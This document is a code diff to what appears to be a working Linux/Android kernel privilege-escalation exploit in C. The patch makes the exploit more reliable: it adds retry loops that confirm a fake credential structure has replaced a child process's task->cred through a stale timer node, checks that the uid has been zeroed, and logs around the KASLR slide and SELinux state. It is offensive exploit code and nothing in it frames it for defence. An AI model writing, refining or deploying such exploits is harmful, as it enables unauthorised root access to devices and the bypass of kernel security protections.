@@ -984,7 +984,7 @@ static const char *getenforce_now(void)
  * When the killer loses the race the exec thread erases the node normally,
  * the reap still finds a clean tree, and the plant reports ok without a byte
  * written -- so the shell path verifies the effect and re-fires. */
-static int proc_real_uid(pid_t pid, int *uid_out)
+static int proc_real_uid(pid_t pid, unsigned long *uid_out)
 {
     char path[64], buf[1024];
     char *p;
@@ -1006,7 +1006,7 @@ static int proc_real_uid(pid_t pid, int *uid_out)
     p += 5;
     while (*p == '\t' || *p == ' ')
         p++;
-    *uid_out = atoi(p);
+    *uid_out = strtoul(p, NULL, 10);
     return 0;
 }
 
@@ -2331,7 +2331,7 @@ int main(int argc, char **argv)
         memset(&r, 0, sizeof(r));
         for (int a = 0; a < 8 && !verified; a++)
         {
-            int uid = -1;
+            unsigned long uid = ~0UL;
 
             logf("[+] plant attempt %d/8\n", a + 1);
             memset(&r, 0, sizeof(r));
@@ -2350,7 +2350,7 @@ int main(int argc, char **argv)
                 verified = 1;
                 break;
             }
-            logf("[!] plant reaped cleanly but write missed (uid=%d)\n", uid);
+            logf("[!] plant reaped cleanly but write missed (uid=%lu)\n", uid);
         }
         if (!verified)
             park_forever("no verified plant");
@@ -2439,34 +2439,82 @@ int main(int argc, char **argv)
  * so one zero write repairs them.
  */
 {
-    int plant_rc = stage_write_retry(g_child_task + OFF_TASK_CRED, 2,
-                                     "fake_cred", raw, 3, &fc);
-
-    if (plant_rc < 0)
-        park_forever("fake cred write failed");
-    if (plant_rc > 0)
     {
-        // Every miss took the exec-success path: no stale timer node
-        // is held, so the blocked cred child can be cleaned up.
-        logf("[!] fake cred retry exhausted without a plant; cleaning up\n");
-        close(go_fd);
-        close(st_fd);
-        kill(C, SIGKILL);
-        waitpid(C, NULL, 0);
-        for (int i = 0; i < g_pool_n; i++)
+        /* The fake plant re-points task->cred at the reclaimed page.  A
+         * clean reap does not prove that erase ran with our payload, and a
+         * missed plant leaves the child on its original cred, so compare the
+         * child's real uid with ours: once the pointer is replaced, uid is
+         * the high half of V+0x78 (0xffffff80 on this VA layout), never the
+         * caller's uid.  Retry until the swap is visible. */
+        unsigned long self_uid = (unsigned long)getuid();
+        int planted = 0;
+
+        for (int a = 0; a < 8 && !planted; a++)
         {
-            close(g_pool[i][0]);
-            close(g_pool[i][1]);
+            unsigned long uid = ~0UL;
+            int rc = stage_write_retry(g_child_task + OFF_TASK_CRED, 2,
+                                       "fake_cred", raw, 1, &fc);
+
+            if (rc < 0)
+                park_forever("fake cred write failed");
+            if (rc > 0)
+                continue;
+            if (!proc_real_uid(C, &uid) && uid != self_uid)
+                planted = 1;
+            else
+                logf("[!] fake cred plant missed (child uid=%lu); retrying\n",
+                     uid);
         }
-        return 1;
+        if (!planted)
+        {
+            /* No stale node is held by the retryable misses, so the blocked
+             * child can be cleaned up. */
+            logf("[!] fake cred retry exhausted without a plant; cleaning up\n");
+            close(go_fd);
+            close(st_fd);
+            kill(C, SIGKILL);
+            waitpid(C, NULL, 0);
+            for (int i = 0; i < g_pool_n; i++)
+            {
+                close(g_pool[i][0]);
+                close(g_pool[i][1]);
+            }
+            return 1;
+        }
     }
 }
         if (!g_slide)
             park_forever("no KASLR slide");
         logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
              SELINUX_STATE_STATIC + g_slide);
-        if (stage_write_retry(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, 3, NULL))
-            park_forever("fake uid fix failed");
+        /* The fake cred lives on the stale timer node itself, so its usage
+         * and uid fields overlap rb_node.__rb_parent_color: the plant writes
+         * V+0x78 there, which leaves uid holding the pointer's high half on a
+         * build whose cred starts with a 4-byte usage (PD2571 starts with an
+         * 8-byte one and its uid lands past the qword).  Zeroing uid+gid is
+         * still enough, but a missed erase leaves uid = -128, so verify the
+         * child's real uid and re-fire. */
+        {
+            int fixed = 0;
+
+            for (int a = 0; a < 8 && !fixed; a++)
+            {
+                unsigned long uid = ~0UL;
+                int rc = stage_write_retry(fc.A + CRED_UID_OFF, 0,
+                                           "fake_uid", raw, 1, NULL);
+
+                if (rc < 0)
+                    park_forever("fake uid fix held a zombie");
+                if (rc > 0)
+                    continue;
+                if (!proc_real_uid(C, &uid) && uid == 0)
+                    fixed = 1;
+                else
+                    logf("[!] fake uid write missed (uid=%lu); retrying\n", uid);
+            }
+            if (!fixed)
+                park_forever("fake uid fix failed");
+        }
 
     }
     logf("[+] cred writes landed, waking child\n");
